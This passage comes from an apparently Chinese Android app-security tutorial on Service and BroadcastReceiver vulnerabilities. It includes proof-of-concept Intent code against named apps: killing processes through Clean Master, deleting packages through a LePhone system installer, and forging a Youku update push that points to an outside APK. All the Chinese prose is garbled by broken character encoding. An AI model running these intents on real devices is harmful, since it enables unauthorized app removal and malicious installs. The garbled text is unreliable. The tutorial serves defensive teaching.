class="keyword">client</span>å¯ä»¥é€šè¿‡IBinderæ¥å£è·å–Serviceå®ä¾‹ï¼Œä»è€Œå®ç°åœ¨<span class="keyword">client</span>ç«¯ç›´æ¥è°ƒç”¨serviceï¼Œå¯ä»¥çµæ´»äº¤äº’</span><br><span class="line">ï¼ˆ<span class="number">3</span>ï¼‰bindServiceå¯åŠ¨çš„æœåŠ¡çš„ç”Ÿå‘½å‘¨æœŸä¸ç»‘å®šçš„<span class="keyword">client</span>æ¯æ¯ç›¸å…³ï¼Œå½“<span class="keyword">client</span>é”€æ¯æ—¶ï¼Œè§£é™¤ç»‘å®šï¼Œæˆ–è€…ä½¿ç”¨unbindService()æ–¹æ³•è§£é™¤ç»‘å®š</span><br></pre></td></tr></table></figure>
<p><strong>å®ç°æ­¥éª¤</strong></p>
<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">æœåŠ¡ç«¯</span><br><span class="line">ï¼ˆ<span class="number">1</span>ï¼‰å®šä¹‰ä¸€ä¸ªç±»ç»§æ‰¿Service</span><br><span class="line">ï¼ˆ<span class="number">2</span>ï¼‰åœ¨Serviceçš„onBind()æ–¹æ³•ä¸­è¿”å›IBinderç±»å‹çš„å®ä¾‹</span><br><span class="line">ï¼ˆ<span class="number">3</span>ï¼‰åœ¨serviceä¸­åˆ›å»ºbinderçš„å†…éƒ¨ç±»ï¼ŒåŠ å…¥ç±»ä¼¼getService()æ–¹æ³•è¿”å›Serviceï¼Œè¿™æ ·ç»‘å®šçš„<span class="keyword">client</span>å°±å¯ä»¥é€šè¿‡getService()æ–¹æ³•è·å¾—Serviceå®ä¾‹äº†</span><br><span class="line"></span><br><span class="line">å®¢æˆ·ç«¯</span><br><span class="line">ï¼ˆ<span class="number">1</span>ï¼‰åœ¨Manifestä¸­é…ç½®Service</span><br><span class="line">ï¼ˆ<span class="number">2</span>ï¼‰åˆ›å»ºServiceConnectionç±»å‹å®ä¾‹ï¼Œå¹¶é‡å†™onServiceConnected()æ–¹æ³•å’ŒonServiceDisconnected()æ–¹æ³•</span><br><span class="line">ï¼ˆ<span class="number">3</span>ï¼‰å½“æ‰§è¡Œåˆ°onServiceConnectedå›è°ƒæ—¶ï¼Œå¯é€šè¿‡IBinderå®ä¾‹å¾—åˆ°Serviceå®ä¾‹å¯¹è±¡ï¼Œè¿™æ ·å¯å®ç°<span class="keyword">client</span>ä¸Serviceçš„è¿æ¥</span><br><span class="line">ï¼ˆ<span class="number">4</span>ï¼‰onServiceDisconnectedå›è°ƒè¢«æ‰§è¡Œæ—¶ï¼Œè¡¨ç¤º<span class="keyword">client</span>ä¸Serviceæ–­å¼€è¿æ¥ï¼Œåœ¨æ­¤å¯ä»¥å†™ä¸€äº›æ–­å¼€è¿æ¥åéœ€è¦åšçš„å¤„ç†</span><br><span class="line">ï¼ˆ<span class="number">5</span>ï¼‰é€šè¿‡Intent å¯åŠ¨æœåŠ¡Intent intent = <span class="keyword">new</span> Intent(<span class="keyword">this</span>,MyService.<span class="keyword">class</span>);</span><br><span class="line">ï¼ˆ<span class="number">6</span>ï¼‰ä½¿ç”¨Contextçš„bindService(Intent,ServiceConnection,<span class="built_in">int</span>)æ–¹æ³•å¯åŠ¨è¯¥Service</span><br><span class="line">ï¼ˆ<span class="number">7</span>ï¼‰ä¸å†ä½¿ç”¨æ—¶ï¼Œè°ƒç”¨unbindService(ServiceConnection)æ–¹æ³•åœæ­¢è¯¥æœåŠ¡</span><br></pre></td></tr></table></figure>
<h3 id="Serviceæ¼æ´åŸç†åˆ†æ">Serviceæ¼æ´åŸç†åˆ†æ</h3>
<p><strong>æ¼æ´ç§ç±»</strong></p>
<ul>
<li>æƒé™æå‡</li>
<li>serviceåŠ«æŒ</li>
<li>æ¶ˆæ¯ä¼ªé€ </li>
<li>æ‹’ç»æœåŠ¡</li>
</ul>
<p>å¦‚æœä¸€ä¸ªå¯¼å‡ºçš„Serviceæ²¡æœ‰åšä¸¥æ ¼çš„é™åˆ¶ï¼Œä»»ä½•åº”ç”¨éƒ½å¯ä»¥å»å¯åŠ¨å¹¶ç»‘å®šåˆ°è¿™ä¸ªServiceä¸Šï¼Œå–å†³äºè¢«æš´éœ²çš„åŠŸèƒ½ï¼Œ è¿™å¯ä»¥æ˜¯ä¸€ä¸ªåº”ç”¨å»æ‰§è¡Œæœªæˆæƒçš„è¡Œä¸ºï¼Œè·å–æ•æ„Ÿä¿¡æ¯æˆ–æ±¡æŸ“ä¿®æ”¹å†…éƒ¨åº”ç”¨çš„çŠ¶æ€é€ æˆå¨èƒã€‚</p>
<h4 id="æƒé™æå‡">æƒé™æå‡</h4>
<p><strong>åŸç†ä»‹ç»</strong></p>
<p>å½“ä¸€ä¸ªserviceé…ç½®äº† intent-filter é»˜è®¤æ˜¯è¢«å¯¼å‡ºçš„ï¼Œå¦‚æœæ²¡æœ‰å¯¹è°ƒç”¨Serviceè¿›è¡Œæƒé™é™åˆ¶æˆ–è€…æ²¡æœ‰å¯¹è°ƒç”¨è€…çš„èº«ä»½è¿›è¡Œæœ‰æ•ˆéªŒè¯ï¼Œé‚£ä¹ˆæ¶æ„æ„é€ çš„appéƒ½å¯ä»¥å¯¹æ­¤Serviceä¼ å…¥æ°å½“çš„å‚æ•°è¿›è¡Œè°ƒç”¨ï¼Œå¯¼è‡´æ¶æ„è¡Œä¸ºå‘ç”Ÿã€‚</p>
<p><strong>æ¼æ´å¤ç°</strong></p>
<p>æ¡ˆä¾‹1 <a target="_blank" rel="noopener" href="https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-048735"><strong>çŒè±¹æ¸…ç†å¤§å¸ˆå†…å­˜æ¸…ç†æƒé™æ³„éœ²æ¼æ´</strong></a></p>
<p>æ¼æ´æè¿°ï¼š</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Androidåº”ç”¨ç¨‹åºçŒè±¹æ¸…ç†å¤§å¸ˆï¼ˆåŸé‡‘å±±æ¸…ç†å¤§å¸ˆï¼‰``<span class="number">4.0</span>``.``<span class="number">1</span>``åŠä»¥ä¸‹ç‰ˆæœ¬å­˜åœ¨æƒé™æ³„æ¼æ¼æ´ï¼Œæ³„éœ²çš„æƒé™ä¸ºandroid<span class="selector-class">.permission</span>.RESTART_PACKAGESï¼Œç”¨æ¥ç»“æŸè¿›ç¨‹æ¥è¾¾åˆ°æ¸…ç†å†…å­˜çš„ç›®çš„ã€‚å½“æ²¡æœ‰ç”³è¯·æ­¤æƒé™çš„appå‘çŒè±¹æ¸…ç†å¤§å¸ˆå‘é€ç›¸åº”çš„intentæ—¶ï¼Œä¾¿å¯ä»¥ç»“æŸåå°è¿è¡Œçš„éƒ¨åˆ†appè¿›ç¨‹ã€‚</span><br><span class="line">çŒè±¹æ¸…ç†å¤§å¸ˆæš´éœ²äº†com<span class="selector-class">.cleanmaster</span><span class="selector-class">.appwidget</span>.WidgetServiceæœåŠ¡ç»„ä»¶ï¼ˆè¯¦è§ä¸‹å›¾ï¼‰ï¼Œå½“å‘æ­¤æœåŠ¡å‘é€actionä¸ºcom<span class="selector-class">.cleanmaster</span><span class="selector-class">.appwidget</span>.ACTION_FASTCLEANçš„intentæ—¶ï¼Œä¾¿å¯ç»“æŸåå°è¿è¡Œçš„ä¸€äº›appè¿›ç¨‹ã€‚</span><br></pre></td></tr></table></figure>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://bbs.kanxue.com/upload/attach/202109/905443_UNDUAUVQQNFQGW6.png" alt="image-20210908160946499"></p>
<p><strong>æ”»å‡»ä»£ç ï¼š</strong></p>
<p>ä½¿ç”¨intentï¼Œå¼€å¯serviceæœåŠ¡</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setAction(<span class="string">&quot;com.cleanmaster.appwidget.ACTION_FASTCLEAN&quot;</span>);</span><br><span class="line">intent.setPackage(<span class="string">&quot;com.cleanmaster.appwidget.WidgetService&quot;</span>);</span><br><span class="line">startService(intent);</span><br></pre></td></tr></table></figure>
<p>æ¡ˆä¾‹äºŒï¼š<a target="_blank" rel="noopener" href="https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2010-0509"><strong>ä¹phoneæ‰‹æœºä»»æ„è½¯ä»¶åŒ…å®‰è£…åˆ é™¤æ¼æ´</strong></a></p>
<p><strong>æ¼æ´æè¿°</strong>ï¼š</p>
<p>ä¹phoneæ‰‹æœºå‡ºå‚é»˜è®¤åŒ…å«ä¸€ä¸ªåä¸ºjp.aplix.midp.toolsçš„åº”ç”¨åŒ…ã€‚æœ¬åº”ç”¨ä»¥systemæƒé™è¿è¡Œï¼Œå¹¶å‘å…¶ä»–åº”ç”¨æä¾›ApkInstalleræœåŠ¡ï¼Œç”¨æ¥è¿›è¡Œå¯¹Apkæ–‡ä»¶çš„å®‰è£…å’Œåˆ é™¤ã€‚é€šè¿‡å‘ApkInstalleræœåŠ¡ä¼ é€’æ„é€ å¥½çš„å‚æ•°ï¼Œæ²¡æœ‰å£°æ˜ä»»ä½•æƒé™çš„åº”ç”¨å³å¯è¾¾åˆ°å®‰è£…å’Œåˆ é™¤ä»»æ„Packageçš„è¡Œä¸ºï¼Œå¯¹ç³»ç»Ÿå®‰å…¨æ€§äº§ç”Ÿæå¤§å½±å“ã€‚</p>
<p><strong>æ”»å‡»ä»£ç </strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">in.setComponent(<span class="keyword">new</span> <span class="title class_">ComponentName</span>(<span class="string">&quot;jp.aplix.midp.tools&quot;</span>,<span class="string">&quot;jp.aplix.midp.tools.ApkInstaller&quot;</span>));</span><br><span class="line">in.putExtra(<span class="string">&quot;action&quot;</span>, <span class="string">&quot;deleteApk&quot;</span>);</span><br><span class="line">in.putExtra(<span class="string">&quot;pkgName&quot;</span>, <span class="string">&quot;xxxxx&quot;</span>);</span><br><span class="line">startService(in);</span><br></pre></td></tr></table></figure>
<h4 id="serviceåŠ«æŒ">serviceåŠ«æŒ</h4>
<p><strong>æ”»å‡»åŸç†</strong>ï¼šéšå¼å¯åŠ¨serviceï¼Œå½“å­˜åœ¨åŒåserviceæ—¶ï¼Œå…ˆå®‰è£…åº”ç”¨çš„serviceä¼˜å…ˆçº§é«˜</p>
<h4 id="æ¶ˆæ¯ä¼ªé€ ">æ¶ˆæ¯ä¼ªé€ </h4>
<p><strong>åŸç†ä»‹ç»</strong>ï¼š</p>
<p>æš´éœ²çš„serviceå¯¹å¤–æ¥æ”¶Intentï¼Œå¦‚æœæ„é€ æ¶æ„çš„æ¶ˆæ¯æ”¾åœ¨Intentä¸­ä¼ è¾“ï¼Œè¢«è°ƒç”¨çš„Serviceæ¥æ”¶å¯èƒ½äº§ç”Ÿå®‰å…¨éšæ‚£</p>
<p><strong>æ¼æ´å¤ç°</strong></p>
<p>æ¡ˆä¾‹ï¼š<a target="_blank" rel="noopener" href="https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2015-094635"><strong>ä¼˜é…·Android 4.5å®¢æˆ·ç«¯å‡çº§æ¼æ´</strong></a></p>
<p><strong>æ¼æ´æè¿°</strong></p>
<p>ä¼˜é…·Android 4.5å®¢æˆ·ç«¯ç»„ä»¶æš´éœ²å¯¼è‡´ç¬¬ä¸‰æ–¹åº”ç”¨å¯ä»¥è§¦å‘å…¶å‡çº§è¿‡ç¨‹ï¼ŒåŒæ—¶å¯ä»¥æŒ‡å®šå‡çº§ä¸‹è½½çš„URLåœ°å€ï¼Œå¯å¯¼è‡´ä»»æ„åº”ç”¨å®‰è£…ï¼</p>
<p>æš´éœ²ç»„ä»¶ï¼š<code>com.youku.service.push.StartActivityService</code></p>
<p>è¯¥ç»„ä»¶å¯¹åº”çš„éƒ¨åˆ†ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onHandleIntent</span><span class="params">(Intent intent)</span> &#123;</span><br><span class="line">        Intent v0;</span><br><span class="line">        String v23;</span><br><span class="line">        <span class="type">Serializable</span> <span class="variable">pushMsg</span> <span class="operator">=</span> intent.getSerializableExtra(<span class="string">&quot;PushMsg&quot;</span>);</span><br><span class="line">        ......</span><br><span class="line">        AppVersionManager.getInstance(Youku.context).showAppAgreementDialog();</span><br><span class="line">        <span class="keyword">switch</span>(pushMsg.type) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>: &#123;</span><br><span class="line">                <span class="keyword">goto</span> label_53;</span><br><span class="line">            &#125;</span><br><span class="line">            ......</span><br><span class="line">        &#125;</span><br><span class="line">        ......</span><br><span class="line">    label_53:</span><br><span class="line">        intent.setFlags(<span class="number">876609536</span>);</span><br><span class="line">        intent.setClass(<span class="built_in">this</span>, UpdateActivity.class);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;updateurl&quot;</span>, pushMsg.updateurl);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;updateversion&quot;</span>, pushMsg.updateversion);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;updatecontent&quot;</span>, pushMsg.updatecontent);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;updateType&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="built_in">this</span>.startActivity(intent);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    ......</span><br></pre></td></tr></table></figure>
<p><strong>æ¼æ´åˆ†æ</strong></p>
<p>æˆ‘ä»¬å¯ä»¥å‘ç°ä»Intentä»è·å–åä¸ºPushMsgçš„Serializableçš„æ•°æ®ï¼Œå¹¶æ ¹æ®å…¶æˆå‘˜typeæ¥æ‰§è¡Œä¸åŒçš„æµç¨‹ï¼Œå½“typeå€¼ä¸º1æ—¶ï¼Œæ‰§è¡ŒAppçš„å‡çº§æ“ä½œã€‚å‡çº§æ‰€éœ€çš„ç›¸å…³æ•°æ®å¦‚appçš„ä¸‹è½½åœ°å€ç­‰ä¹Ÿæ˜¯ä»è¯¥åºåˆ—åŒ–æ•°æ®ä¸­è·å–ã€‚å‡çº§çš„å…·ä½“æµç¨‹åœ¨com.youku.ui.activity.UpdateActivityä¸­ï¼Œç®€å•åˆ†æåå‘ç°å‡çº§è¿‡ç¨‹æœªå¯¹ä¸‹è½½åœ°å€ç­‰è¿›è¡Œåˆ¤æ–­ï¼Œå› æ­¤å¯ä»¥ä»»æ„æŒ‡å®šè¯¥åœ°å€ã€‚</p>
<p><strong>æ¼æ´æ”»å‡»</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä½¿ç”¨ä¸‹é¢ä»£ç  ä¿®æ”¹pushMsgå†…å®¹ï¼Œå¹¶é‡æ‰“åŒ…è¿›ç›®æ ‡åº”ç”¨ä¸­ è¿›è€Œå®ç°ä¼ªé€ </span></span><br><span class="line"><span class="type">PushMsg</span> <span class="variable">pushMsg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PushMsg</span>();</span><br><span class="line">pushMsg.type = <span class="number">1</span>;</span><br><span class="line">pushMsg.updateurl = <span class="string">&quot;http://gdown.baidu.com/data/wisegame/41839d1d510870f4/jiecaojingxuan_51.apk&quot;</span>;</span><br><span class="line">pushMsg.updatecontent = <span class="string">&quot;This is Fake&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setClassName(<span class="string">&quot;com.youku.phone&quot;</span>,<span class="string">&quot;com.youku.service.push.StartActivityService&quot;</span>);</span><br><span class="line">intent.putExtra(<span class="string">&quot;PushMsg&quot;</span>, pushMsg);</span><br><span class="line">startService(intent);</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­PushMsgç±»ä¸éœ€è¦å®Œæ•´å®ç°ï¼Œåªéœ€è¦ç¼–è¯‘é€šè¿‡å³å¯ï¼›<br>
2.åç¼–è¯‘ä¼˜é…·å®¢æˆ·ç«¯çš„Appå¾—åˆ°smaliä»£ç ï¼Œä»ä¸­æå–å‡ºPushMsg.smaliï¼›<br>
3.åç¼–è¯‘ä¸Šè¿°åˆ›å»ºçš„APKæ–‡ä»¶ï¼Œå°†åŸPushMsgç±»çš„smaliæ–‡ä»¶æ›¿æ¢ä¸ºä¼˜é…·ä¸­çš„PushMsg.smaliæ–‡ä»¶ï¼Œé‡æ–°æ‰“åŒ…ç­¾åï¼›<br>
4.å®‰è£…å¹¶è¿è¡Œé‡æ‰“åŒ…åçš„APKï¼Œä¼šçœ‹åˆ°ä¼˜é…·çš„å‡çº§é¡µé¢è§¦å‘ï¼Œå¦‚æœè®¾è®¡çš„å¥½çš„è¯ï¼Œæ˜¯å¯ä»¥è¯±å¯¼ç”¨æˆ·å®‰è£…æ”»å‡»è€…æŒ‡å®šçš„APKæ–‡ä»¶çš„ã€‚</p>
<h4 id="æ‹’æ¥æœåŠ¡æ”»å‡»"><strong>æ‹’æ¥æœåŠ¡æ”»å‡»</strong></h4>
<p><strong>åŸç†ä»‹ç»</strong></p>
<p>Serviceçš„æ‹’ç»æœåŠ¡ä¸»è¦æºäºServiceå¯åŠ¨æ—¶å¯¹æ¥æ”¶çš„Intentç­‰æ²¡æœ‰åšå¼‚å¸¸å¤„ç†æƒ…å†µä¸‹ï¼Œå¯¼è‡´å´©æºƒï¼Œä¸»è¦ä½“ç°åœ¨ç»™Serviceä¼ è¾“çš„intentæˆ–è€…ä¼ è¾“åºåˆ—åŒ–å¯¹è±¡å¯¼è‡´æ¥æ”¶æ—¶å€™çš„ç±»å‹ä¼ åŒ–å¼‚å¸¸ã€‚</p>
<p><strong>æ¼æ´å¤ç°</strong></p>
<p><a target="_blank" rel="noopener" href="https://wy.zone.ci/bug_detail.php?wybug_id=wooyun-2014-048028"><strong>é›ªçƒæœ€æ–°Androidå®¢æˆ·ç«¯å­˜åœ¨ç©ºæŒ‡é’ˆå¼‚å¸¸åŠä¿¡æ¯æ³„éœ²æ¼æ´</strong></a></p>
<p>adb shell ä¸‹æ‰§è¡Œä¸‹é¢å‘½ä»¤ï¼Œè™šæ‹Ÿæœºå°†å´©æºƒã€‚æ„¿æ„åœ¨äºç©ºæŒ‡é’ˆè°ƒç”¨</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/905443_N58T5GMF5RW6URH.png" alt="image-20210908160946499"></p>
<h4 id="Serviceçš„å®‰å…¨é˜²æŠ¤">Serviceçš„å®‰å…¨é˜²æŠ¤</h4>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">å®‰å…¨é˜²æŠ¤ï¼š</span><br><span class="line">    ï¼ˆ<span class="number">1</span>ï¼‰ç§æœ‰serviceä¸å®šä¹‰<span class="built_in">int</span>ent-filterå¹¶ä¸”è®¾ç½®exportedä¸º<span class="literal">false</span></span><br><span class="line">    ï¼ˆ<span class="number">2</span>ï¼‰å…¬å¼€çš„serviceè®¾ç½®exportedä¸º<span class="literal">true</span>ï¼Œ<span class="built_in">int</span>ent-filterå¯ä»¥å®šä¹‰æˆ–è€…ä¸å®šä¹‰</span><br><span class="line">    ï¼ˆ<span class="number">3</span>ï¼‰åˆä½œserviceéœ€å¯¹åˆä½œæ–¹çš„appç­¾ååšæ ¡éªŒ</span><br><span class="line">    ï¼ˆ<span class="number">4</span>ï¼‰åªè¢«åº”ç”¨æœ¬èº«ä½¿ç”¨çš„serviceåº”è®¾ç½®ä¸ºç§æœ‰</span><br><span class="line">    ï¼ˆ<span class="number">5</span>ï¼‰serviceæ¥æ”¶çš„æ•°æ®éœ€è¦è°¨æ…å¤„ç†</span><br><span class="line">    ï¼ˆ<span class="number">6</span>ï¼‰å†…éƒ¨serviceéœ€è¦ä½¿ç”¨ç­¾åçº§åˆ«çš„protectionLevelæ¥åˆ¤æ–­æ˜¯å¦ä¸ºå†…éƒ¨åº”ç”¨è°ƒç”¨</span><br><span class="line">    ï¼ˆ<span class="number">7</span>ï¼‰ä¸åº”åœ¨serviceåˆ›å»ºï¼ˆonCreateæ–¹æ³•è¢«è°ƒç”¨ï¼‰çš„æ—¶å€™å†³å®šæ˜¯å¦æä¾›æœåŠ¡ï¼Œåº”åœ¨onStartCommand/onBind/onHandleIntentç­‰æ–¹æ³•è¢«è°ƒç”¨æ—¶åšåˆ¤æ–­</span><br><span class="line">    ï¼ˆ<span class="number">8</span>ï¼‰å½“serviceåˆè¿”å›æ•°æ®çš„æ—¶å€™ï¼Œå› åˆ¤æ–­æ•°æ®æ¥æ”¶appæ˜¯å¦åˆä¿¡æ¯æ³„éœ²çš„é£é™©</span><br><span class="line">    ï¼ˆ<span class="number">9</span>ï¼‰æœ‰æ˜ç¡®çš„æœåŠ¡éœ€è°ƒç”¨æ—¶ä½¿ç”¨æ˜¾ç¤ºæ„å›¾</span><br><span class="line">    ï¼ˆ<span class="number">10</span>ï¼‰å°½é‡ä¸å‘é€æ•æ„Ÿä¿¡æ¯</span><br><span class="line">    ï¼ˆ<span class="number">11</span>ï¼‰å¯åŠ¨Activityæ—¶ä¸è®¾ç½®<span class="built_in">int</span>entçš„FLAG_ACTIVITY_NEW_TASKæ ‡ç­¾</span><br></pre></td></tr></table></figure>
<h2 id="BroadcastReceiverç›¸å…³æ¼æ´">BroadcastReceiverç›¸å…³æ¼æ´</h2>
<h3 id="è‡ªå®šä¹‰å¹¿æ’­æ¥æ”¶è€…BroadcastReceiver">è‡ªå®šä¹‰å¹¿æ’­æ¥æ”¶è€…BroadcastReceiver</h3>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ç»§æ‰¿BroadcastReceivreç±»</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">mBroadcastReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">// å¤å†™onReceive()æ–¹æ³•</span></span><br><span class="line">  <span class="comment">// æ¥æ”¶åˆ°å¹¿æ’­åï¼Œåˆ™è‡ªåŠ¨è°ƒç”¨è¯¥æ–¹æ³•</span></span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">   <span class="comment">//å†™å…¥æ¥æ”¶å¹¿æ’­åçš„æ“ä½œ</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">æ“ä½œæ­¥éª¤ï¼š</span><br><span class="line">ï¼ˆ<span class="number">1</span>ï¼‰ç»§æ‰¿BroadcastReceivreåŸºç±»</span><br><span class="line">ï¼ˆ<span class="number">2</span>ï¼‰å¿…é¡»å¤å†™æŠ½è±¡æ–¹æ³•onReceive()æ–¹æ³•</span><br><span class="line">    å¹¿æ’­æ¥æ”¶å™¨æ¥æ”¶åˆ°ç›¸åº”å¹¿æ’­åï¼Œä¼šè‡ªåŠ¨å›è°ƒ onReceive() æ–¹æ³•ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒonReceiveæ–¹æ³•ä¼šæ¶‰åŠ ä¸ å…¶ä»–ç»„ä»¶ä¹‹é—´çš„äº¤äº’ï¼Œå¦‚å‘é€Notificationã€å¯åŠ¨Serviceç­‰ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œå¹¿æ’­æ¥æ”¶å™¨è¿è¡Œåœ¨ UI çº¿ç¨‹ï¼Œå› æ­¤ï¼ŒonReceive()æ–¹æ³•ä¸èƒ½æ‰§è¡Œè€—æ—¶æ“ä½œï¼Œå¦åˆ™å°†å¯¼è‡´ANR</span><br></pre></td></tr></table></figure>
<h3 id="å¹¿æ’­æ¥æ”¶è€…æ³¨å†Œ"><strong>å¹¿æ’­æ¥æ”¶è€…æ³¨å†Œ</strong></h3>
<p>æ³¨å†Œçš„ä¸¤ç§æ–¹å¼ï¼šé™æ€æ³¨å†Œï¼ŒåŠ¨æ€æ³¨å†Œ</p>
<p><strong>é™æ€æ³¨å†Œ</strong></p>
<p>åœ¨AndroidManifest.xmlé‡Œé€šè¿‡<receive>æ ‡ç­¾å£°æ˜</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span></span></span><br><span class="line"><span class="tag">    //<span class="attr">æ­¤å¹¿æ’­æ¥æ”¶è€…ç±»æ˜¯mBroadcastReceiver</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;.mBroadcastReceiver&quot;</span> &gt;</span></span><br><span class="line">    //ç”¨äºæ¥æ”¶ç½‘ç»œçŠ¶æ€æ”¹å˜æ—¶å‘å‡ºçš„å¹¿æ’­</span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.net.conn.CONNECTIVITY_CHANGE&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>åŠ¨æ€æ³¨å†Œ</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">I <span class="type">ntentFilter</span> <span class="variable">intentFilter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">intentFilter</span>();</span><br><span class="line">intentFilter.addAction(<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">registerReceiver(<span class="string">&quot;networkChangeReceiver&quot;</span>,intentFilter);</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onPause</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">super</span>.onPause;</span><br><span class="line">    unregisterReceive(networkChangeReceiver);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">networkChangeReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context,Intent intent)</span>&#123;</span><br><span class="line">        Toast.makeText(context,<span class="string">&quot;network changes&quot;</span>,Toast.LENGTH_SHORT).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
